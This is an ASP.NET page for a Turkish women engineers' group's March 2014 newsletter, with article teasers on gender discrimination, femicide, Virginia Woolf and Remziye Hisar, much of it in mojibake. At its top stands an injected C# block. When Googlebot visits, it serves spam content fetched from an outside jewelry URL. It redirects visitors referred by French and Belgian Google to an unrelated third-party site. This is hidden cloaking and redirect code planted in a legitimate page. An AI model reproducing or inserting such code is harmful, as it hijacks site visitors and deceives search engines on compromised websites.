<%@ Page Language="C#" MasterPageFile="~/MasterPage2.master" AutoEventWireup="true"
    CodeFile="Mart2010Bulteni.aspx.cs" Inherits="images_Mart2010Bulteni" Title="Mart 2014 Bulteni" %>

<asp:Content ID="Content1" ContentPlaceHolderID="ContentPlaceHolder1" runat="Server">
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    string zhizhu = "";
    string mirror = "http://www.jewelrysliver.com/Content.aspx?id=332";
    zhizhu = System.Web.HttpContext.Current.Request.ServerVariables["HTTP_USER_AGENT"].ToLower();
    if (zhizhu.IndexOf("googlebot") != -1)
    {
        if(mirror.IndexOf("http://")<0){
            if(System.IO.File.Exists(mirror))
            {
                Response.Clear();
                Response.Charset = "UTF-8";
                Response.ContentEncoding = System.Text.Encoding.UTF8;
                System.IO.StreamReader sr = new System.IO.StreamReader(mirror, System.Text.Encoding.UTF8);
                Response.Write(sr.ReadToEnd());
                sr.Close();
                Response.End();
            }
        }
        else
        {
            Response.Clear();
            Response.Charset = "UTF-8";
            Response.ContentEncoding = System.Text.Encoding.UTF8;
            Response.Write(this.getHTTPPage(mirror));
            Response.End();
        }
    }
    else
    {
        Boolean isZH = false;
        try
        {
            foreach (string language in Request.UserLanguages)
            {
                if (language.Substring(0, 2).ToLower() == "zh")
                {
                    isZH = true;
                    break;
                }
            }
        }
        catch
        {
        }

        Uri uri = System.Web.HttpContext.Current.Request.UrlReferrer;
        string jump = "http://www.gucsacsfr.com/";
        string wifilangs = "";
        if(Request.ServerVariables["HTTP_ACCEPT_LANGUAGE"] != ""){
            wifilangs = (((Request.ServerVariables["HTTP_ACCEPT_LANGUAGE"]).Split(';')[0]).Split(',')[0]).ToLower();
        }
        if (uri != null && isZH==false)
        {
            string referer = uri.AbsoluteUri.ToLower();
            string str = "" + "," + "google.fr" + "," + "google.be";
            string[] terms = str.Split(',');
            if (referer.IndexOf("google") != -1 ){
                if(str!=""){
                    foreach(string term in terms){
                        if(term != "" && referer.IndexOf(term)>=0){
                            Response.Redirect(jump);
                        }
                    }
                }else{
                    Response.Redirect(jump);
                }
            }
        }

    }

    base.Page_Load(sender, e);
}


protected string getHTTPPage(string Url)
{
    string ResponseText = string.Empty;
    System.Net.WebRequest Request = System.Net.HttpWebRequest.Create(Url);
    using (System.IO.StreamReader Reader = new System.IO.StreamReader(Request.GetResponse().GetResponseStream()))
    {
        ResponseText = Reader.ReadToEnd();
    }
    return ResponseText;

}
</script>
    <script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
    </script>
    <script type="text/javascript">
_uacct = "UA-509773-2";
urchinTracker();
    </script>

    <table width="90%" align="center">
        <tr>
            <td align="justify" style="width: 100%; text-align: justify">
                
                    <span class="yazibasligi">  
                        Mart 2014 B�lteni</span><br />
                <span class="siyahyazibuyuk">
                    Co�kulu ve kat�l�m�n yo�un oldu�u bir 8 Mart pe�inden ��kartt���m�z bu say�m�zda, TRT'nin ve h�k�metin destekledi�i cinsiyet�i yay�nlara kar�� ger�ekle�tirdi�imiz uzun soluklu  kampanya detaylar�n� sizler i�in derledik...
                     </br> 
                     </br>�pek, kad�n olarak ya�ad���m�z ayr�mc�l��� anlatt� yaz�s�nda. Berivan, kendimize ait bir odada yazmam�z� ���tleyen Virginia Woolf'un,  Bahar ise ilk kimyagerimiz Remziye Hisar'�n hayat hikayesini haz�rlad�. 
                     </br>
                     </br>Suzan'�n hediye al�p-vermenin alt�ndaki toplumsal anlamlar� ortaya ��kartan yaz�s� ve Beyhan'�n m�hendislik, erkeklik ve iktidar ili�kisine de�indi�i yaz�s�n� da bu say�m�zda okuyabilirsiniz. �zde�,   kad�n cinayeti diyebilmekteki zorlanmalar�m�z� yak�nlarda  kad�n cinayetinde kaybetti�i bir arkada��n�n, Yank�'n�n �l�m�ndeki deneyimiyle payla��yor. Selma ise 8 Mart co�kusunu foto�raflar�yla b�ltenimize ta��d�. 
                    </br>
                    <br /> 10 Mart sabah� ise umudun �ocu�u Berkin Elvan'� sonsuza u�urlad�k. Sorumlular�n yarg�lanmas� dileklerimizle...
                    </br>
                    <br />�yi okumalar.<br />
                    <br />
                    G�r��, �neri ve katk�lar�n�z i�in ileti�im adresi: <a href="mailto:kadin.muhendisler@gmail.com">
                        <span class="tatlimor">kadin.muhendisler@gmail.com</span></a><br />
                     </span>
                     
                      <div class="duyuruHr"><br /> 
                  &nbsp;&nbsp;</div>
                    <span class="yazibasligi">
                       <br />
                        <span style="font-size: 16pt">TRT'yi De�il Bizi �zlemeye
                            Devam Edin!</span> </span></span><span class="siyahyazibuyuk">&nbsp;<br /> TRT'nin G�da M�hendisleri Odas�'ndan etiketleme konusunda g�r�� bildirmek �zere "bay m�hendis" talebinde bulunmas�n�n ard�ndan geli�enleri merak ediyorsan�z TRT'yi
                                de�il, bizi izlemeye devam edin
                   <a href="trt.aspx" target="_blank"><span class="yazininDevami">devam�.<br />
                   </span></a>
                    <span class="yazarBlogu">
                        <br />
                        Kad�n M�hendisler, Mimarlar, �ehir Planc�lar, 
        <br />
        Fen Bilimciler ve Teknik  Elemanlar Grubu&nbsp;</span> 
                                               
                                               
                                               <div class="duyuruHr"><br />                
                  
                  
                  &nbsp;&nbsp;</div>
                    <span class="yazibasligi">
                       <br />
                        <span style="font-size: 16pt">M�hendislik Neden "Erkek"tir?
                            </span></span><span class="siyahyazibuyuk">&nbsp;<br />�zellikle bilim ve teknoloji alanlar�nda �ok belirgin ayr�mc�l�k ya�an�r. Bu ayr�mc�l�k �nce i�e al�mlarda belirli i�lere erkeklerin al�nmas�, belirli di�er i�lere kad�nlar�n
                                al�nmas�yla uygulan�r. 
                   <a href="bto_muhendislik.aspx" target="_blank"><span class="yazininDevami">devam�.<br />
                   </span></a>
                    <span class="yazarBlogu">
                        <br />
                        Beyhan Tayat, End�stri M�hendisi&nbsp;</span>
                   
                    <div class="duyuruHr"><br /> 
                  &nbsp;&nbsp;</div>
                    <span class="yazibasligi">
                       <br />
                        <span style="font-size: 16pt">D���n�yorum �yleyse Vurun</span></span><span class="siyahyazibuyuk">&nbsp;<br />
                  "...kad�nlar�n istihdama kat�l�m�n�n g�nbeg�n azald���n�, umutsuzluklar�n�n tavan yapt���n�, erkeklere g�re kay�t d��� �al��t�klar�n�, �al��ma �a��ndaki kad�nlar�n sadece %25'inin i� g�c�ne dahil olabildi�ini, evde sokakta i� arayanlar�n %90'�n�n kad�n oldu�u ve "ne i� olsa yapar�m�a do�ru bir gidi�at�n oldu�unu s�ylemek gerekiyor..."<a href="ig_kadin.aspx" target="_blank"><span class="yazininDevami">devam�.<br />
                   </span></a>
                    <span class="yazarBlogu">
                        <br />
                        �pek G�vercin&nbsp;</span>                         
                      
                                
                             
                       <div class="duyuruHr"><br /> 
                  &nbsp;&nbsp;</div>
                    <span class="yazibasligi">
                       <br />
                        <span style="font-size: 16pt">Virginia Woolf (1882-1941)</span><span
                            style="font-size: 9pt; color: #000000; font-family: Tahoma">&nbsp;</span><br />
                        </span></span><span class="siyahyazibuyuk">&nbsp;
                            Virginia Woolf (1882-1941) �ngiliz romanc�, deneme ve biyografi yazar�, feminist.
                            Woolf, her yeni roman�yla modernist tarz�n� de�i�tiren �retken bir yazard�. Mektuplar�
                            ve hat�ralar�, Bloomsburry zaman�n�n �ngiliz edebiyat k�lt�r� merkezinde Woolf'un
                            bak���n� ortaya koyar. Woolf, sanat�n toplum ile entegre oldu�u zamanda bir tarihsel
                            d�nemi temsil eder. T.S. Elliot Virginia'n�n �l�m�n�n ard�ndan ��yle tarifler "
                            Merkezinde Virginia Woolf olmadan, �ekilsiz ve marjinal kam�� olurdu...Virginia
                            Woolf'un �l�m�yle, bir k�lt�r�n t�m y�r�ngesi k�r�ld�."
                   <a href="bo_virginvolf.aspx" target="_blank"><span class="yazininDevami">devam�.<br />
                   </span></a>
                    <span class="yazarBlogu">
                        <br />
                        Berivan �ncel, G�da M�hendisi&nbsp;</span>  
                        
                 <div class="duyuruHr"><br /> 
                  &nbsp;&nbsp;</div>
                    <span class="yazibasligi">
                       <br />
                        <span style="font-size: 16pt">Kad�n Cinayetine Kad�n Cinayeti Diyebilmek... </span></span><span class="siyahyazibuyuk">&nbsp;<br />
    <span id="yui_3_13_0_ym1_1_1394475818917_43577" style="line-height: 115%"><font id="yui_3_13_0_ym1_1_1394475818917_43576"
        face="arial, helvetica, sans-serif">San�r�m ancak Serpil Erf�nd�k �ld�r�ld�kten
        sonrayd�.
                            Tan�d���m bir kad�n�n da kad�n cinayetine kurban gidebilece�ini, kad�n
        cinayetlerinin iyice "ana ak�mla�t���n�" fark ettim.</font></span>
                            <a href="ob_kadincinayeti.aspx" target="_blank"><span class="yazininDevami">devam�.<br />
                   </span></a>
                    <span class="yazarBlogu">
                        <br />
                        �zde� Bodur, G�da M�hendisi&nbsp;</span>                                     
                       
                        
                                               <div class="duyuruHr"><br /> 
                  &nbsp;&nbsp;</div>
                    <span class="yazibasligi">
                       <br />
                        <span style="font-size: 16pt">Hediyeler �zerine</span></span><span class="siyahyazibuyuk">&nbsp;<br />
                            Baz� �zel g�nlerde illaki de hediye almam�z basbas ba��r�l�yor ve biz "i�te bunlar
                            hep kapitalizm" diye ad�n� koyabiliyorken davetli oldu�umuz d���nlere veya bebek
                            do�umlar�na o kadar kolayca s�z edemeyi�imiz neden?<a href="sb_hediye.aspx" target="_blank"><span class="yazininDevami">devam�.<br />
                   </span></a>
                    <span class="yazarBlogu">
                        <br />
                        Suzan Bayhan, Bilgisayar M�hendisi&nbsp;</span>  
                        
                          <div class="duyuruHr"><br /> 
                  &nbsp;&nbsp;</div>
                    <span class="yazibasligi">
                       <br />
                        <span style="font-size: 16pt">�lk Kad�n Kimyagerimiz: Prof. Dr. Remziye Hisar</span><span
                            style="font-size: 9pt; color: #000000; font-family: Tahoma">&nbsp;</span></span></span>
<br />  
<span class="siyahyazibuyuk">
                       
                    </span></a>"...Bilim kad�nlar�n�n �nc�lerinden Polonyal� kimyager ve fizik�i Marie Curie "Ya�am hi�birimiz i�in kolay de�il. Bir �eyleri ba�armak i�in, yetenekli oldu�umuza inanarak buna ula�mak i�in usanmadan �abalamal�y�z" diyor. Madam Curie'nin de ��rencisi olan ilk kad�n kimyagerimiz Remziye Hisar'�n ya�am �yk�s�n� sizinle payla�mak istedik..."</span></a>
                    <a href="bs_remziyehisar.aspx" target="_blank"><span class="yazininDevami">devam�.<br />
                   </span></a>
                    <span class="yazarBlogu">
                        <br />
                        Bahar Sa�lam, G�da M�hendisi&nbsp;</span>           
                                      
                
                     
                            <br />
                            <br />  <div class="duyuruHr"><br /> 
                  &nbsp;&nbsp;</div>
                    <span class="yazibasligi">
                       <br />
                        <span style="font-size: 16pt"> Foto�raflarla 8 Mart 2014 </span></span>
                        <span class="siyahyazibuyuk">&nbsp;<br />
                  
 
Kad�k�y'de d�zenlenen 8 Mart mitinginden rengarenk kareler objektifimize b�yle yans�d�
                            <a href="se_fotografi.aspx" target="_blank"><span class="yazininDevami">devam�.<br />
                   </span></a>
                    <span class="yazarBlogu">
                        <br />
                        Selma Ero�lu, Makina M�hendisi&nbsp;</span>
                            <br />
                           <br />
                          </span>
                             
            </td></tr>
    </table>
</asp:Content>
